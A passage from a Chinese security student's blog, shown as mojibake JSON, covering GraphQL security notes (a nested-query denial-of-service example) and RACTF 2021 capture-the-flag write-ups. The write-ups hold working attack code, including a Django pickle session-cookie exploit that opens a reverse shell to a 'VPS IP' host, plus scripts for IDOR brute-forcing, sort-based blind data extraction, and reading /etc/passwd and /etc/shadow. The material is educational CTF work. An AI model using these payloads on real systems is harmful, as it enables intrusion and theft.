â€”â€”â€”â€”æ›´å¤šçš„GraphQLiç›¸å…³é—®é¢˜å¯å‚è§è¿™ä¸ªgitä»“åº“ï¼Œä¸€æœ¬æ»¡è¶³ï¼ˆ\næ‹’ç»æœåŠ¡ GraphQLä¸­çš„queryå’Œmutationçš„è¿”å›ç»“æœéƒ½æ˜¯å¯ä»¥æœ‰åµŒå¥—çš„å¯¹è±¡çš„ï¼Œå¦‚æœä¸å¯¹åµŒå¥—æ·±åº¦è¿›è¡Œé™åˆ¶ï¼Œæœ‰å¯èƒ½è¢«åˆ©ç”¨ä»è€Œè¿›è¡Œæ‹’ç»æœåŠ¡æ”»å‡»ã€‚\nä¸€ä¸ªä¸¾ä¾‹ï¼š\nå®šä¹‰äº†Blogå’ŒAuthor:\ntype Blog{ _id: String! type: BlogType avatar: String title: String content: [String] author: Author .... } type Author{ _id: String! name: String blog: [Blog] } éƒ½æœ‰å„è‡ªçš„Query:\nextend type Query{ blogs( blogId: ID systemType: String! ): [Blog] } extend type Query{ author( _id: String ): Author } æˆ‘ä»¬å¯ä»¥æ„é€ è¿™æ ·çš„æŸ¥è¯¢ï¼Œæ— é™å¥—å¨ƒå¯¼è‡´dos\nquery GetBlogs($blogId: ID, $systemType: String!) { blogs(blogId: $blogId, systemType: $systemType) { _id title type content author { name blog { author { name blog { author { name blog { author { name blog { author { name blog { author { name blog { author { name blog { author { name # and so on... } } } } } } } } } } } } } title createdAt publishedAt } } publishedAt } } è§£å†³è¿™ä¸ªé—®é¢˜æˆ‘ä»¬éœ€è¦åœ¨GraphQLæœåŠ¡å™¨ä¸Šé™åˆ¶æŸ¥è¯¢æ·±åº¦ï¼ŒåŒæ—¶è®¾è®¡GraphQLæ¥å£æ—¶å°½é‡é¿å…å‡ºç°æ­¤ç±»é—®é¢˜ï¼Œä»¥Node.jsä¸ºä¾‹ï¼Œgraphql-depth-limitå°±å¯ä»¥è§£å†³è¿™æ ·çš„é—®é¢˜\n// ... import depthLimit from 'graphql-depth-limit'; // ... const server = new ApolloServer({ typeDefs: schemaText, resolvers: resolverMap, context: ({ ctx }) =\u0026gt; { const token = ctx.req.headers.authorization || ''; const user = getUser(token); console.log('user', user) return{ ...user, ...ctx, ...app.context }; }, validationRules: [ depthLimit(10) ] }); // ... Graphene-Django DEBUGæ¨¡å¼ä¸‹çš„å®‰å…¨é—®é¢˜ åœ¨CTFä¸­çš„è¡¨ç° [HITB CTF Singapore 2017]Blog\n[SECT 2017]Dark Market | wp2\n[Hack in Paris CTF 2019]Meet Your Doctor 1 2 3 | wp2\n[VolgaCTF 2020]Library\n[corCTF 2021]devme\nç»“å°¾ Damn Vulnerable GraphQL Application-\u0026gt; ä¸€ä¸ªæ¼æ´å¤ç°çš„é¶åœºï¼ŒåŒ…å«äº†ä¸Šé¢æåˆ°å’Œæ²¡æåˆ°çš„GraphQLå­˜åœ¨çš„æ´\ndocker pull dolevf/dvga docker run -d -p 5000:5000 -e WEB_HOST=0.0.0.0 dolevf/dvga å·²ç»æœ‰å†™å¥½çš„wpäº† ä¸å‘äº’è”ç½‘äº§å‡ºæ¹¿åƒåœ¾ ä»æˆ‘åšèµ·\n   ä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æ¥ æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ   ä¸­æ–‡å®˜ç½‘\nåœ¨çº¿GraphiQL\nlearn-graphql\nä»€ä¹ˆæ˜¯ GraphQLï¼Ÿ\nç©è½¬graphQL\nGraphQL ä»å…¥é—¨åˆ°å®è·µ\nã€CuteJavaScriptã€‘GraphQLçœŸé¦™å…¥é—¨æ•™ç¨‹\næ”»å‡»GraphQL\nGraphQLå®‰å…¨æŒ‡åŒ—\nUWP GraphQLæ•°æ®æŸ¥è¯¢çš„å®ç°\nGraphQL Mutations\nGraphQL NoSQL Injection Through JSON Types\nGraphQL Injection\nã€å®‰å…¨è®°å½•ã€‘ç©è½¬GraphQL - DVGAé¶åœºï¼ˆä¸Šï¼‰\nã€å®‰å…¨è®°å½•ã€‘ç©è½¬GraphQL - DVGAé¶åœºï¼ˆä¸‹ï¼‰\n[HITB CTF Singapore 2017]Blog\n[SECT 2017]Dark Market | wp2\n[Hack in Paris CTF 2019]Meet Your Doctor 1 2 3 | wp2\n[VolgaCTF 2020]Library\n  å¼€å­¦äº†ï¼Œä¸æ‘†çƒ‚ä»æˆ‘åšèµ·\n","date":"2021-09-03T20:56:54+08:00","permalink":"https://amiaaaz.github.io/2021/09/03/graphql-study-notes/","section":"posts","tags":["GraphQL"],"title":"GraphQLå­¦ä¹ ç¬”è®°"},{"categories":[],"contents":"ä½ å¥½å‘€ï¾Ÿâˆ€ï¾Ÿ)ãƒ\nè¿™é‡Œæ˜¯è‘µå­ï¼Œä¸€ä¸ªä¿¡å®‰ä¸“ä¸šçš„æ™®é€šå¤§äºŒå­¦ç”Ÿ\nè¶…é«˜æ ¡çº§ç½‘ä¸Šå†²æµªçˆ±å¥½è€…ï¼Œå–œæ¬¢çœ‹ä¹¦ï¼Œå¬æ­Œå’Œæ€è€ƒäººç”Ÿï¼Œå–œæ¬¢æ‰“éŸ³æ¸¸å’Œä¸€äº›å•æœºæ¸¸æˆï¼Œè¿åŠ¨ç»†èƒä¸º0\nctf webæ–¹å‘çš„çœ‹é¢˜é€‰æ‰‹ï¼ˆåˆ«é—®ä¸ºä»€ä¹ˆåªæ˜¯çœ‹é¢˜ é—®å°±æ˜¯ç­¾åˆ°é¢˜éƒ½ä¸ä¼šï¼‰ï¼Œä¸è¿‡äººèœç˜¾å¤§ï¼Œæ—¥å¸¸çç¢ç£¨ï¼Œçç ”ç©¶ï¼›å…´è¶£é©±åŠ¨å‹ï¼Œæœ‰ä¸€é¢—æƒ³æˆä¸ºå…¨æ ˆçš„å¿ƒï¼ˆæ¢¦æƒ³è¿˜æ˜¯è¦æœ‰çš„ï¼Œæ—¥æ‹±ä¸€å’ï¼Œè¯´ä¸å®šå°±å®ç°äº†\nåœ¨åŠªåŠ›è®©è‡ªå·±çœ‹èµ·æ¥ä¸é‚£ä¹ˆèœï¼Œè¿›åº¦0/nï¼ˆå·²ç»è„±ç¦»è´Ÿæ•°äº†ï¼å¥½æ¶ˆæ¯ï¼‰\nè‡´åŠ›äºç‚¹å‡ºä¸€æ£µèŒ‚ç››ã€æµ“å¯†çš„æŠ€èƒ½æ ‘ã€‚æ—¢ç„¶â€œä»¥æœ‰æ¶¯éšæ— æ¶¯â€ä¼šdie();ï¼Œé‚£å°±è®¾å¥½æ–­ç‚¹ï¼Œåœ¨è°ƒè¯•çš„è¿‡ç¨‹ä¸­æ…¢æ…¢debugï¼Œè¯´ä¸å®šå°±Bypassäº†å‘¢ï¼Ÿ\nè¿™ä¸ªå°å°çš„åšå®¢ä¼šåŒ…å«ä¸€äº›ç²—ç³™ä½†è´¨æœ´çš„ç¬”è®°å’Œç²¾è‡´ä¸”åŒæ ·ç”¨å¿ƒçš„wpï¼Œè¿˜ä¼šæœ‰ä¸€äº›ä¿¡æ‰‹å†™å°±çš„æ–‡å­—ï¼Œäº21å¹´7æœˆåº•å¼€å¼ ã€‚\nè™½ç„¶ç°åœ¨åªæœ‰ä¸€äº›å«æ°´é‡å¾ˆé«˜ã€æŠ€æœ¯åŠ›å¾ˆä½çš„äº’è”ç½‘å¹²åƒåœ¾ï¼Œä½†æœªæ¥è¿™é‡Œä¸€å®šä¼šæœ‰è‡ªå·±çš„åŸåˆ›äº§å‡ºï¼›è™½ç„¶ç°åœ¨å°ç«™é—¨å¯ç½—é›€ï¼Œä½†å¸Œæœ›æœ‰ä¸€å¤©å¯ä»¥ä¸ºæ›´å¤šçš„äººå¸¦æ¥å¸®åŠ©ï¼›å¸Œæœ›åœ¨å­¦å®‰å…¨çš„é“è·¯ä¸Šä¸€ç›´èµ°ä¸‹å»\nstay hungry, stay foolish.\n  I wanna be defined by the things that I love\nNot the things I hate\nNot the things I\u0026rsquo;m afraid of, I\u0026rsquo;m afraid of\nOr the things that haunt me in the middle of the night\nI, I just think that\nYou are what you love\n ","date":"2021-08-25T01:39:57+08:00","permalink":"https://amiaaaz.github.io/about/","section":"","tags":[],"title":"About"},{"categories":["CTF"],"contents":"https://2021.ractf.co.uk/\nhttps://github.com/ractf/challenges/tree/master/2021\nhttps://github.com/404dcd/RACTF-challenges\nhttps://blog.ractf.co.uk/tag/ractf-2021/\nWeb/Really Awesome Monitoring Dashboard  ğŸŒŸ Perfect infrastructure ğŸŒŸ\n æ˜¯grafana\nä½†æ˜¯ç‰ˆæœ¬ä¹Ÿå¤ªæ–°äº†å§8.1.1ï¼Œå¼±å£ä»¤ä¹Ÿæ²¡æœ‰ï¼ŒæŠ“åŒ…å¯ä»¥çœ‹åˆ°å®ƒåœ¨ä¸åœçš„è¯·æ±‚å„ç§apiï¼Œå…¶ä¸­æœ‰ä¸ª/api/ds/queryï¼Œä»¥æ˜æ–‡æ–¹å¼è¯·æ±‚æ•°æ®åº“å†…å®¹\né‚£è¿™å°±å¥½è¯´äº†ï¼Œç›´æ¥æ˜ç‰Œäº†éƒ½\nSELECT name FROM sqlite_master WHERE type ='table' AND name NOT LIKE 'sqlite_%'; SELECT * FROM flags; â€”â€”â€”â€”è¿™ä¸ªæ•…äº‹å‘Šè¯‰æˆ‘ä»¬å¯¹äºæƒé™çš„è®¾ç½®æ˜¯å¾ˆé‡è¦çš„ï¼Œä¸è¦éšä¾¿æŠŠapiæ¥å£æš´éœ²å‡ºæ¥ï¼Œä¹Ÿä¸è¦æ˜æ–‡ä¼ é€’ä¿¡æ¯\nWeb/Really Awesome Hidden Service  Ahoy, matey! Some dirty scallywags seem to not be respectin' th' pirate code! Teach them a lesson by findin' out who they be.\nractfysfo3ncuhk5nwzou5mpwmwqrc6ll6ubogd4eotvuhrbr4hcpsid.onion  ä¸€ä¸ªTorçš„ç½‘ç«™ï¼Œèµ°åŒ¿åæ–¹å¼\né‚£é¦–å…ˆè¦æŠŠéšè—åœ¨åé¢çš„çœŸå®ipç»™æ‰¾å‡ºæ¥ã€‚æ•´ä¸ªç½‘é¡µçš„å†…å®¹æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„ï¼Œä½†æ˜¯é€šå¸¸å®¹æ˜“è¢«å¿½ç•¥çš„æ˜¯faviconå›¾åƒï¼Œè¿™é‡Œå¯ä»¥å‚è€ƒè¿™æ ·ä¸€ç¯‡æ–‡ç« ï¼šHunting phishing websites with favicon hashes\nè¿™é‡Œå¯ä»¥ç”¨fav-upä¸€æŠŠæ¢­ï¼ˆä¹Ÿå°±æ˜¯è‡ªåŠ¨åŒ–äº†æå–å›¾æ ‡-\u0026gt;è®¡ç®—mmhashå€¼-\u0026gt;shodanæœç´¢å‡ºipè¿™ä¸ªè¿‡ç¨‹ï¼‰ï¼Œå¾—åˆ°ipä¸º178.62.4.214|178.62.15.164\nractf{DreadingPirates}\nâ€”â€”â€”â€”é™¤æ­¤ä¹‹å¤–è¿˜æœ‰ä¸€ä¸ªéé¢„æœŸè§£ï¼Œå½“ç”¨éæ³•çš„host headerè¯·æ±‚æ—¶ï¼Œä¼šç›´æ¥è¿”å›flag\n$ curl -s --socks5-hostname localhost:9050 -H \u0026#34;Host: asd.com\u0026#34; ractfysfo3ncuhk5nwzou5mpwmwqrc6ll6ubogd4eotvuhrbr4hcpsid.onion | grep \u0026#34;ractf\u0026#34; All you need to do is send the server an invalid host header, which will cause it to fail back to its default vhost which reveals the flag. In retrospect, the solution to this would have been to make the flag only visible on a specific vhost, rather than the default.\nWeb/Emojibook  The flag is at /flag.txt\n å¯ä»¥ç™»å½•ã€æ³¨å†Œè´¦æˆ·ã€å‘å¸ƒnoteã€æŸ¥çœ‹ï¼Œç»™å‡ºäº†æºç \nçœ‹æºç ï¼Œæ˜¯djangoæ¡†æ¶çš„åç«¯ï¼Œç›´å¥”settings.py\nçœ‹åˆ°äº†ç†Ÿæ‚‰çš„pickle\nåœ¨ä»…æœ‰çš„è¿™ä¸ªappçš„view.pyä¸­æœ‰è¿™æ ·çš„ä»£ç ï¼Œä¼šåœ¨noteçš„bodyéƒ¨åˆ†åŒ¹é…{{.*?}}è¿™æ ·çš„å†…å®¹å¹¶å°†å…¶ä¸­çš„éƒ¨åˆ†æ‹¼æ¥åˆ°/emoji/åä»¥imageçš„å½¢å¼åŠ è½½å‡ºæ¥ï¼Œä½†æ˜¯ç›´æ¥ç”¨{{/flag.txt}}æ˜¯ä¸å¯ä»¥çš„ï¼Œè¿™éƒ¨åˆ†ä»£ç åœ¨forms.pyä¸­\næ‰€ä»¥æœ€ç»ˆçš„payloadæ˜¯ {..{/flag.txt}..}\nractf{dj4ng0_lfi}\nâ€”â€”â€”â€”ç„¶è€Œè¿™é‡Œæœ‰ä¸ªéé¢„æœŸï¼Œurléƒ¨åˆ†å¯ä»¥ç›´æ¥ä¿®æ”¹noteç¼–å·è¾¾åˆ°æ°´å¹³è¶Šæƒï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥é€šè¿‡çˆ†ç ´æ–¹å¼æ‰¾åˆ°ä¹‹å‰å·²ç»æˆåŠŸçš„note\nimport logging import threading import time import requests def thread_function(name): try: r=requests.get(\u0026#34;http://193.57.159.27:30160/\u0026#34;+str(name)) if (\u0026#34;base64\u0026#34; in r.text and \u0026#34;cmFjdGZ7\u0026#34; in r.text): print(r.text) except: pass if __name__ == \u0026#34;__main__\u0026#34;: threads = list() for index in range(1000): x = threading.Thread(target=thread_function, args=(index,)) threads.append(x) x.start() for index, thread in enumerate(threads): thread.join() Web/Emojybook 2  no unintended solution this time! the source has not been patched, the unintended solution was caused by my dockerfile\nThe flag is at /flag.txt\n è·Ÿä¸Šé¢é‚£ä¸ªå‰ç«¯ä¸€æ¨¡ä¸€æ ·ï¼Œç„¶è€Œè¿™æ¬¡å†ç”¨ä¹‹å‰çš„ {..{/flag.txt}..}ä¼šè¿”å›500é”™è¯¯ï¼Œè¿™å›å°±è¦ç”¨ä¸Šä¹‹å‰å®Œå…¨æ²¡ç”¨åˆ°çš„pickle session cookieäº†ã€‚\nå…ˆè¯»ä¸€ä¸‹/app/notebook/settings.pyï¼Œå¾—åˆ°secret_keyï¼Œç„¶åæä¸€ä¸ªåå¼¹shellçš„cookieå‡ºæ¥\n# Modified from https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/ #!/usr/bin/python import django.core.signing, django.contrib.sessions.serializers from django.http import HttpResponse from django.conf import settings import pickle import os import requests SECRET_KEY = \u0026#39;wr`BQcZHs4~}EyU(m]`F_SL^BjnkH7\u0026#34;(S3xv,{sp)Xaqg?2pj2=hFCgN\u0026#34;CR\u0026#34;UPn4\u0026#39; settings.configure(DEFAULT_HASHING_ALGORITHM=\u0026#34;sha256\u0026#34;) # Initial cookie when visiting the page cookie=\u0026#34;.eJxNjEEKwjAQRUVwKYKn0E1Impmm3Yl7z1AmSWNbJYW2WQoeIMt4D4-ookL_8r3Hv68ez8V3t7SL64rC1FRhrIeqtSkuS0xxO4OazKX2b7O3Hflzz0zvp6HV7JOwnx3Zqbf19fhvN7ODhsYmxQOQyMjmSIpzLjMCYyRpDTlwI5wAaTNwFhWgwVISaVWgUKiVcM4V4FJgLxnJP1s:1mFhOG:5yO4Fkp6kQCGyt6e5jHf6Gn5V6gqPDWIw21OTFSw8DM\u0026#34; newContent = django.core.signing.loads(cookie,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt=\u0026#39;django.contrib.sessions.backends.signed_cookies\u0026#39;) class PickleRce(object): def __reduce__(self): import os return (os.system,(\u0026#34;python -c \u0026#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\u0026#34;VPS IP\\\u0026#34;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\\u0026#34;/bin/sh\\\u0026#34;)\u0026#39;\u0026#34;,)) newContent[\u0026#39;testcookie\u0026#39;] = PickleRce() new_cookie = django.core.signing.dumps(newContent,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt=\u0026#39;django.contrib.sessions.backends.signed_cookies\u0026#39;,compress=True) # We can then make a request with this cookie requests.get(\u0026#34;http://193.57.159.27:23934/\u0026#34;, cookies={ \u0026#34;sessionid\u0026#34;: new_cookie }) å¾—åˆ°shellä¹‹åæˆ‘ä»¬åªæ˜¯ä¸ªwebç”¨æˆ·ï¼Œè¯»/etc/shadowå¯ä»¥iå¾—åˆ°adminçš„hashå€¼ï¼Œå¼±å£ä»¤ æ˜¯ä¸ª999999ï¼Œç„¶åæˆ‘ä»¬å°±å¯ä»¥su adminï¼Œè¯»flagäº†\nractf{dj4ng0_lfi_rce_not_unintended}\nå‚è€ƒï¼šwp\nWeb/Military Grade  Go is safe, right? That means my implementation of AES will be secure?\n ç»™å‡ºäº†goæ–‡ä»¶\npackage main import ( \u0026#34;bytes\u0026#34; \u0026#34;crypto/aes\u0026#34; \u0026#34;crypto/cipher\u0026#34; \u0026#34;encoding/hex\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;math/rand\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;sync\u0026#34; \u0026#34;time\u0026#34; ) const rawFlag = \u0026#34;[REDACTED]\u0026#34; var flag string var flagmu sync.Mutex func PKCS5Padding(ciphertext []byte, blockSize int, after int) []byte { padding := (blockSize - len(ciphertext)%blockSize) padtext := bytes.Repeat([]byte{byte(padding)}, padding) return append(ciphertext, padtext...) } func encrypt(plaintext string, bKey []byte, bIV []byte, blockSize int) string { bPlaintext := PKCS5Padding([]byte(plaintext), blockSize, len(plaintext)) block, err := aes.NewCipher(bKey) if err != nil { log.Println(err) return \u0026#34;\u0026#34; } ciphertext := make([]byte, len(bPlaintext)) mode := cipher.NewCBCEncrypter(block, bIV) mode.CryptBlocks(ciphertext, bPlaintext) return hex.EncodeToString(ciphertext) } func changer() { ticker := time.NewTicker(time.Millisecond * 672).C for range ticker { rand.Seed(time.Now().UnixNano() \u0026amp; ^0x7FFFFFFFFEFFF000) for i := 0; i \u0026lt; rand.Intn(32); i++ { rand.Seed(rand.Int63()) } var key []byte var iv []byte for i := 0; i \u0026lt; 32; i++ { key = append(key, byte(rand.Intn(255))) } for i := 0; i \u0026lt; aes.BlockSize; i++ { iv = append(iv, byte(rand.Intn(255))) } flagmu.Lock() flag = encrypt(rawFlag, key, iv, aes.BlockSize) flagmu.Unlock() } } func handler(w http.ResponseWriter, req *http.Request) { flagmu.Lock() fmt.Fprint(w, flag) flagmu.Unlock() } func main() { log.Println(\u0026#34;Challenge starting up\u0026#34;) http.HandleFunc(\u0026#34;/\u0026#34;, handler) go changer() log.Fatal(http.ListenAndServe(\u0026#34;:80\u0026#34;, nil)) } å¯ä»¥çœ‹åˆ°flagè¢«AES CBCåŠ å¯†ï¼ŒåŠ å¯†æœ¬èº«æ²¡é—®é¢˜ï¼Œé—®é¢˜å‡ºåœ¨ç§å­ä¸Šï¼›ç§å­ç”Ÿæˆæ˜¯é rand.Seed(time.Now().UnixNano() \u0026amp; ^0x7FFFFFFFFEFFF000)å®Œæˆï¼Œè¿™æ ·å¾—åˆ°çš„ç§å­å¾ˆå° å¯ä»¥è¢«æˆ‘ä»¬çˆ†ç ´å‡ºæ¥\nexp.go\npackage main import( \u0026#34;math/rand\u0026#34; \u0026#34;crypto/aes\u0026#34; \u0026#34;crypto/cipher\u0026#34; \u0026#34;encoding/hex\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;strings\u0026#34; ) func main() { hextext := \u0026#34;35e57017892d2c615ed057d20eeee56f82c7b02d2d1b7efed6944c3cc660c914\u0026#34; // Encrypted Flag \tfor seed:=1; seed\u0026lt;=19777868; seed++ { rand.Seed(int64(seed)) for i := 0; i \u0026lt; rand.Intn(32); i++ { rand.Seed(rand.Int63()) } var key []byte var iv []byte for i := 0; i \u0026lt; 32; i++ { key = append(key, byte(rand.Intn(255))) } for i := 0; i \u0026lt; aes.BlockSize; i++ { iv = append(iv, byte(rand.Intn(255))) } block, _ := aes.NewCipher(key) mode := cipher.NewCBCDecrypter(block, iv) ciphertext, _ := hex.DecodeString(hextext) flagBytes := make([]byte, len(ciphertext)) mode.CryptBlocks(flagBytes, ciphertext) flag := string(flagBytes) if strings.Contains(flag, \u0026#34;ractf\u0026#34;) { fmt.Printf(\u0026#34;Flag: %s\\n\u0026#34;, flag) break } } } ractf{int3rEst1ng_M4sk_paTt3rn}\nå‚è€ƒï¼šwp\nWeb/Secret Store  How many secrets could a secret store store if a store could store secrets?\n æ³¨å†Œå’Œç™»å½•ä¹‹åå¯ä»¥é€šè¿‡apiè®¾ç½®ä¸€ä¸ªè‡ªå·±çš„secretï¼Œè®¾ç½®å¥½ä¹‹åè¿˜å¯ä»¥æ›´æ”¹\nç»™å‡ºäº†æºç ï¼Œæ˜¯djangoæ¡†æ¶ï¼Œç”¨åˆ°äº†rest_frameworkï¼Œé¡µé¢çš„debugæ¨¡å¼è¿˜å¼€ç€ï¼Œæœ‰ä¸€ä¸ªåä¸ºsecretçš„app\nmodels.pyè§„å®šäº†æ•°æ®åº“çš„å­˜å‚¨\nè¿˜æœ‰ä¸ªé…å¥—çš„model serializerï¼Œè§„å®šäº†åªè¯»å’Œåªå†™çš„ä¸åŒå†…å®¹\nç„¶åæ˜¯views.pyï¼Œå½“ç¡®è®¤userç™»å½•çŠ¶æ€ä¹‹åï¼Œå¦‚æœè®¾ç½®è¿‡secretå°†ä¼šå±•ç¤ºå‡ºæ¥\nç›´æ¥ç”¨Getæ–¹å¼è¯·æ±‚/api/secret/?format=jsonå¯ä»¥å¾—åˆ°æ‰€æœ‰è®¾ç½®è¿‡çš„secretï¼Œç†æ‰€å½“ç„¶çš„çŒœæµ‹id=1,owner=1çš„value=flagï¼Œä½†æ˜¯valueå­—æ®µæ˜¯åªå†™è€Œéåªè¯»çš„\nç”±äºç”¨çš„æ˜¯djangoçš„rest frameworkï¼Œå¯ä»¥åˆ©ç”¨å®ƒçš„Ordering FilteråŠŸèƒ½æ¥å¯¹è¿™äº›jsonå†…å®¹æ ¹æ®valueæ¥è¿›è¡Œä¸€ä¸ªæ’åº/api/secret/?ordering=value\u0026amp;format=json\né‡‡ç”¨char-by-charçš„ç›²æ³¨æ–¹å¼ï¼Œä¸æ–­åœ°é‡å¤è®¾ç½®secret-\u0026gt;ä»¥valueæ’åº-\u0026gt;å¦‚æœä½äºid=1,owner=1çš„å‰é¢ï¼Œå¹¶ä¸”ä¸‹ä¸€æ¬¡å°±ä½äºå®ƒçš„åé¢ï¼Œè¯´æ˜è¿™æ˜¯æ­£ç¡®çš„å­—ç¬¦-\u0026gt;ä¿®æ”¹secretï¼Œç»§ç»­çˆ†ç ´ä¸‹ä¸€ä¸ªå­—ç¬¦\nexp.py\nimport requests import json flag = \u0026#34;ractf\u0026#34; csrf_token = \u0026#34;XI7ZT6jdFeTvlywSDvRQT2xFlIAF2BRIF7ndzDOZqWPwZsIRdkbmgFSIpV8m9NIu\u0026#34; session_id = \u0026#34;hkdm1dclym6oycoe8pcmyvlh5d87qfvq\u0026#34; headers = { \u0026#34;Cookie\u0026#34;: f\u0026#34;csrftoken={csrf_token}; sessionid={session_id}\u0026#34;, \u0026#34;X-CSRFToken\u0026#34;: csrf_token } our_secret_id = 14 def update_secret(curr_flag): found_real_char = False for i in range(32, 127): payload = curr_flag + chr(i) json_payload = { \u0026#34;value\u0026#34;: payload } r = requests.post(\u0026#34;http://193.57.159.27:21627/api/secret/\u0026#34;, data=json_payload, headers=headers) # print(r.status_code) r = requests.get( \u0026#34;http://193.57.159.27:21627/api/secret/?ordering=value\u0026amp;format=json\u0026#34;, headers=headers) secrets = json.loads(r.text) for secret in secrets: if secret[\u0026#39;id\u0026#39;] == 1: found_real_char = True if secret[\u0026#39;id\u0026#39;] == our_secret_id: if found_real_char: return chr(i - 1) else: break return chr(i - 1) while True: next_char = update_secret(flag) flag += next_char print(\u0026#39;[+] Curr Flag:\u0026#39;, flag) ractf{data_exf1l_via_s0rt1ng_0c66de47}\nå‚è€ƒï¼šwp1 wp2\nWeb/I\u0026rsquo;m a fun  Agent,\nDo you remember the firearms store case from last year? The one they were using as a secret communication platform?\nWell, we\u0026rsquo;ve located the servers for them, the issue is they\u0026rsquo;re based abroad in a country where we do not have any jurisdiction. Thus, we\u0026rsquo;ll need to gain shell access to their systems the good old way. They\u0026rsquo;re hosting another webapp again, this time it seems like some early version of a social media network that they\u0026rsquo;re working on. This is good for us as it means there will almost certainly be some vulnerabilities present.\nWe\u0026rsquo;ve linked the webapp for you, can you take a look and see if you can gain access to their server?\n åœ¨/upload/contentå¤„å¯ä»¥ä¸Šä¼ videoï¼Œç‰¹åˆ«çš„æ˜¯ä¸Šä¼ å¤„æœ‰ä¸ªexternal\nç”¨curlæ–¹å¼è¯·æ±‚ä¸€ä¸‹/etc/passwdï¼Œcurl -X POST http://193.57.159.27:26635/upload/content -F file=/etc/passwd -F source=internal\nä¹‹åå°è¯•è¯»æºç ï¼ˆæˆ‘æ²¡çˆ†å‡ºæ¥ç›®å½•ï¼‰ï¼Œä¹‹åçš„çœ‹wpäº†ï¼Œæˆ‘å¤ªèœ\nractf{l4ws_0f_phys1cs_c4n_tak3_a_h1ke}\nå‚è€ƒï¼šwp\nOSINT/Triangles https://www.google.com.hk/maps/place/Palazzo+Cosentini/@36.9267665,14.7344974,17z/data=!3m1!4b1!4m5!3m4!1s0x1311999df7357997:0x700f5a852df15e3!8m2!3d36.9267676!4d14.7366924?hl=zh-TW\nMiscellaneous/Discord  Come join our Discord!\n ractf{so_here_we_are_again}\nMiscellaneous/Missing Tools  Man, my friend broke his linux install pretty darn bad. He can only use like, 4 commands. Can you take a look and see if you can recover at least some of his data?\nUsername: ractf\nPassword: 8POlNixzDSThy\nNote: it may take a minute or more for your container to start depending on load\n æ ¹æ®ç»™å‡ºçš„ä¿¡æ¯sshè¿å…¥ä¸€ä¸ªç»ˆç«¯ï¼Œå¯ä»¥å‘ç°å¾ˆå¤šçš„å‘½ä»¤éƒ½è¢«ç¦æ­¢äº†\nä½¿ç”¨echo /usr/bin/* /bin/*å¯ä»¥æŸ¥çœ‹èƒ½ä½¿ç”¨çš„å‘½ä»¤è¿˜æœ‰å“ªäº›\nâ€”â€”â€”â€”å…ˆè¯´ä¸€ä¸‹ç®€å•çš„éé¢„æœŸè§£ï¼šecho *æ‰¾åˆ°flag.txtï¼Œç„¶åsource flag.txtæˆ–è€…sh \u0026lt; flag.txtéƒ½èƒ½è¯»å‡ºæ¥\nè€Œé¢„æœŸè§£ä½¿ç”¨çš„æ˜¯split+re-sha256çš„æ–¹å¼ã€‚ç›´æ¥ç”¨sha256sumå¾—åˆ°flagç„¶åæƒ³å¼ºè¡Œæš´åŠ›ç ´è§£æ˜¾ç„¶éå¸¸çš„ä¸ç°å®ï¼Œä½†æ˜¯splitè¿™ä¸ªå·¥å…·å¯ä»¥ä»¥å›ºå®šçš„å­—èŠ‚æ•°æ¥åˆ’åˆ†ç»™å®šçš„æ–‡ä»¶ï¼Œå¦‚æœæˆ‘ä»¬ä»¥å¾ˆå°çš„æ ‡å°ºæ¥åˆ’åˆ†flagå¹¶è¿›è¡Œsha256ï¼Œé‚£ä¹ˆè¿™æ ·å¾—åˆ°çš„hashå€¼å°±å°†éå¸¸æœ‰å¯èƒ½çˆ†ç ´å‡ºæ¥ï¼Œæœ€åå†æŠŠå®ƒä»¬åˆèµ·æ¥å°±èƒ½å¾—åˆ°æœ€ç»ˆçš„flagäº†ï¼ˆè¿™é‡Œç”¨3bytesåˆ’åˆ†ï¼‰\n$ split -b 3 flag.txt $ echo * flag.txt xaa xab xac xad xae xaf xag xah xai xaj xak xal $ sha256sum xa* df10b4bd068175bd33f200e48e721a019091c67c06c26ae273da5aaf51424618 xaa 582c3f2f5c5c630d0ee458d5d7c859e7ed36d6fb5862a761e110562438bd4272 xab a7f5397443359ea76c50be82c77f1f893a060925b51a332cc5da906f83d3344e xac 569a659ae7633e5ddd7f523b283c1169dad3eb99a3da4b3ad2d5619d9236dc12 xad 7096489b19f4ab1b6c9e1502367c18d5e3adcfeb21b0a0282041ca99e798a14d xae 618630d1fed7f03ed43dfb03eeae681c1812177c43d3afe1cbe32bb3fee12bf9 xaf f2f9ca19dad6782e5e92edd758439f11067ae23ab0d418a56f406de6c9bb151a xag f481b98f744da847f44f5e67996010859061dca4945e87396016a1ef4ac38460 xah de7bc3aee118c9689e2cba40c4c427ab8986b8a37c9c4f837e019559de9faffd xai a14d511b5d8b444da7ea5ab52feb71271a46bb8374ab24f5251701b23bef4276 xaj 56fb98daea7879c3e2218eb960b9150c2d7978686af5f7f43f80641a6f62b22a xak df8238034568781a5df3098ed46435fee0df6c807938e7dbeccb0a29f887d246 xal åˆ°CrackStationä¸€æŠŠæ¢­\nractf{std0ut_1s_0v3rr4ted_spl1t_sha}\n å®³ï¼Œå‰å‡ å¤©çŠ¶æ€è«åå¾ˆå·®ï¼Œä¹‹å‰æŠ¥çš„å‡ 